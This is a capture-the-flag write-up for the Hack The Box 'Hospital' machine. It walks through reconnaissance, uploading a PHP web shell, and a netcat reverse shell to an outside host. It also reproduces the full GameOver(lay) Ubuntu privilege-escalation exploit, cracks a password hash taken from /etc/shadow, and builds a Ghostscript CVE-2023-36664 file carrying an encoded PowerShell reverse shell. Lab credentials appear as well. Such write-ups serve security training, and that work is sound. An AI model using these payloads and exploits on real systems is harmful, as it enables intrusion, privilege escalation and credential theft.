# Hospital Write-up

<img src="https://labs.hackthebox.com/storage/avatars/e980d18b909fa0ba8f519cf9777fd413.png" width="200" height="200">

## Nmap

 `nmap -sC -sV 10.10.11.241`

    PORT     STATE SERVICE           VERSION
    22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
    |_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
    53/tcp   open  domain            Simple DNS Plus
    88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-03-30 14:49:52Z)
    135/tcp  open  msrpc             Microsoft Windows RPC
    139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
    389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)      
    | ssl-cert: Subject: commonName=DC                                                                                                    
    | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb                                                                               
    | Not valid before: 2023-09-06T10:49:03                                                                                               
    |_Not valid after:  2028-09-06T10:49:03                                                                                               
    443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)                                              
    | ssl-cert: Subject: commonName=localhost                                                                                             
    | Not valid before: 2009-11-10T23:48:47                                                                                               
    |_Not valid after:  2019-11-08T23:48:47                                                                                               
    |_ssl-date: TLS randomness does not represent time                                                                                    
    | tls-alpn:                                                                                                                           
    |_  http/1.1                                                                                                                          
    |_http-title: Hospital Webmail :: Welcome to Hospital Webmail                                                                         
    |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28                                                                 
    445/tcp  open  microsoft-ds?                                                                                                          
    464/tcp  open  kpasswd5?                                                                                                              
    593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0                                                                  
    636/tcp  open  ldapssl?
    | ssl-cert: Subject: commonName=DC
    | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
    | Not valid before: 2023-09-06T10:49:03
    |_Not valid after:  2028-09-06T10:49:03
    1801/tcp open  msmq?
    2103/tcp open  msrpc             Microsoft Windows RPC
    2105/tcp open  msrpc             Microsoft Windows RPC
    2107/tcp open  msrpc             Microsoft Windows RPC
    2179/tcp open  vmrdp?
    3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC
    | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
    | Not valid before: 2023-09-06T10:49:03
    |_Not valid after:  2028-09-06T10:49:03
    3269/tcp open  globalcatLDAPssl?
    | ssl-cert: Subject: commonName=DC
    | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
    | Not valid before: 2023-09-06T10:49:03
    |_Not valid after:  2028-09-06T10:49:03
    3389/tcp open  ms-wbt-server     Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: HOSPITAL
    |   NetBIOS_Domain_Name: HOSPITAL
    |   NetBIOS_Computer_Name: DC
    |   DNS_Domain_Name: hospital.htb
    |   DNS_Computer_Name: DC.hospital.htb
    |   DNS_Tree_Name: hospital.htb
    |   Product_Version: 10.0.17763
    |_  System_Time: 2024-03-30T14:50:45+00:00
    | ssl-cert: Subject: commonName=DC.hospital.htb
    | Not valid before: 2024-03-25T12:01:14
    |_Not valid after:  2024-09-24T12:01:14
    8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-open-proxy: Proxy might be redirecting requests
    | http-title: Login
    |_Requested resource was login.php
    |_http-server-header: Apache/2.4.55 (Ubuntu)
    Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: 6h59m53s, deviation: 0s, median: 6h59m53s
    | smb2-time: 
    |   date: 2024-03-30T14:50:46
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required

## Dig

  `dig any hospital.htb @10.10.11.241`

    ; <<>> DiG 9.19.21-1-Debian <<>> any hospital.htb @10.10.11.241
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 30326
    ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 5
    
    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 4000
    ;; QUESTION SECTION:
    ;hospital.htb.                  IN      ANY
    
    ;; ANSWER SECTION:
    hospital.htb.           600     IN      A       10.10.11.241
    hospital.htb.           600     IN      A       192.168.5.1
    hospital.htb.           3600    IN      NS      dc.hospital.htb.
    hospital.htb.           3600    IN      SOA     dc.hospital.htb. hostmaster.hospital.htb. 882 900 600 86400 3600
    hospital.htb.           600     IN      AAAA    dead:beef::7d68:290a:40ee:d64d
    hospital.htb.           600     IN      AAAA    dead:beef::244
    
    ;; ADDITIONAL SECTION:
    dc.hospital.htb.        3600    IN      A       10.10.11.241
    dc.hospital.htb.        3600    IN      A       192.168.5.1
    dc.hospital.htb.        3600    IN      AAAA    dead:beef::7d68:290a:40ee:d64d
    dc.hospital.htb.        3600    IN      AAAA    dead:beef::244
    
    ;; Query time: 176 msec
    ;; SERVER: 10.10.11.241#53(10.10.11.241) (TCP)
    ;; WHEN: Sat Mar 30 03:53:22 EDT 2024
    ;; MSG SIZE  rcvd: 281

Add `hospital.htb` `dc.hospital.htb` `hostmaster.hospital.htb` to /etc/hosts

## Dirsearch 

`python3 dirsearch.py -u http://hospital.htb:8080/ --exclude-status 403,404,400,401 -o dir`

      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    Target: http://hospital.htb:8080/
    
    301 -  316B  - /js  ->  http://hospital.htb:8080/js/             
    200 -    0B  - /config.php                                       
    301 -  317B  - /css  ->  http://hospital.htb:8080/css/           
    301 -  319B  - /fonts  ->  http://hospital.htb:8080/fonts/       
    301 -  320B  - /images  ->  http://hospital.htb:8080/images/     
    301 -  315B  - /l  ->  http://hospital.htb:8080/l/               
    200 -    6KB - /login.php                                        
    301 -  315B  - /m  ->  http://hospital.htb:8080/m/               
    200 -    5KB - /register.php                                     
    200 -    0B  - /upload.php                                       
    301 -  321B  - /uploads  ->  http://hospital.htb:8080/uploads/   

hospital.htb:8080

![image](https://github.com/zer00d4y/writeups/assets/128820441/3cbf84dc-4b29-4634-80fa-734e347fd3c8)

Create account and login

![image](https://github.com/zer00d4y/writeups/assets/128820441/c621fbe9-5ba2-4c82-80ae-662fc86a0bd5)

Try to upload p0wny-shell

https://github.com/flozz/p0wny-shell/

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

    wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
    
    mv shell.php shell.phar

![image](https://github.com/zer00d4y/writeups/assets/128820441/8fa92552-09b7-4304-9fad-7dadb81733cd)

hospital.htb:8080/uploads/shell.phar

![image](https://github.com/zer00d4y/writeups/assets/128820441/2fb77fe4-9d50-4738-bca3-0bc05663276e)

![image](https://github.com/zer00d4y/writeups/assets/128820441/d5c1a440-30e4-44c6-b6ab-9cbad8116f62)

![image](https://github.com/zer00d4y/writeups/assets/128820441/121d5113-63c4-4fff-9662-e722405a56bd)

Stabilizing the shell

Start listener and use payload

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.91 4444 >/tmp/f

![image](https://github.com/zer00d4y/writeups/assets/128820441/4c688f5a-d820-4732-be9f-45789765a064)

![image](https://github.com/zer00d4y/writeups/assets/128820441/b4f63f18-c3d5-4e81-8729-27009722d801)

https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh

    wget https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh

`exploit.sh`

    #!/bin/bash
    
    # CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
    # by g1vi https://github.com/g1vi
    # October 2023
    
    echo "[+] You should be root now"
    echo "[+] Type 'exit' to finish and leave the house cleaned"
    
    unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'

![image](https://github.com/zer00d4y/writeups/assets/128820441/19a69751-ad50-4692-80c8-caa334c253f2)

Start python server 

![image](https://github.com/zer00d4y/writeups/assets/128820441/58cd9759-4e0d-48ef-80dd-1c6a7f80ff0f)

![image](https://github.com/zer00d4y/writeups/assets/128820441/4e9c4047-f2ab-43ec-8361-c6ca29b3f9f8)

    chmod +x exploit.sh
    
    ./exploit.sh

![image](https://github.com/zer00d4y/writeups/assets/128820441/b6d74598-7db2-4c61-91fb-75a38e4f0139)

and read /etc/shadow

## Hashcat 

`hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

    $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
    Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
    Time.Started.....: Sat Mar 30 08:18:13 2024 (2 mins, 13 secs)
    Time.Estimated...: Sat Mar 30 08:20:26 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:     1604 H/s (7.38ms) @ Accel:256 Loops:256 Thr:1 Vec:4
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 214272/14344385 (1.49%)
    Rejected.........: 0/214272 (0.00%)
    Restore.Point....: 214016/14344385 (1.49%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
    Candidate.Engine.: Device Generator
    Candidates.#1....: raycharles -> pucci
    Hardware.Mon.#1..: Util: 90%

![image](https://github.com/zer00d4y/writeups/assets/128820441/3d2dd8a2-11c9-4345-83aa-05a49446069c)

Login with credentials `drwilliams`:`qwe123!@#`

![image](https://github.com/zer00d4y/writeups/assets/128820441/b54de6c5-e76b-45d2-8d38-d4fc6bea5f6c)

![image](https://github.com/zer00d4y/writeups/assets/128820441/ee7e398d-3a50-452b-b73b-df7bfb9e9a53)

https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

![image](https://github.com/zer00d4y/writeups/assets/128820441/4517e87e-657e-44d6-b9fc-dbc9d4794682)

    python3 CVE_2023_36664_exploit.py --generate --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAxACIALAA0ADIANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --filename shell --extension eps

![image](https://github.com/zer00d4y/writeups/assets/128820441/606631e9-e137-4ce3-8a62-11319c1910f4)

Send our `shell.eps`

![image](https://github.com/zer00d4y/writeups/assets/128820441/90cb460e-7b69-4e2d-8de0-bb870abaa42f)

![image](https://github.com/zer00d4y/writeups/assets/128820441/78e0d3e0-b114-4170-96b1-37d58e7b2f15)

Get the user flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/973cdf7b-9488-41d6-96d1-e4dabd992571)

## Privilege Escalation

ghostscript.bat

![image](https://github.com/zer00d4y/writeups/assets/128820441/ccb20785-c7ad-448c-813b-62fd653cb001)

    rpcclient -U "drbrown" hospital.htb
    
    chr!$br0wn

![image](https://github.com/zer00d4y/writeups/assets/128820441/6cd962b3-a083-4498-93a1-e99938668f6d)



hospital.htb/shell.php

![image](https://github.com/zer00d4y/writeups/assets/128820441/c01746b4-21c3-4ebe-a0bd-524c2b8b5322)

Get the root flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/f18f990b-7615-4a13-b8d2-fe6528e14c99)



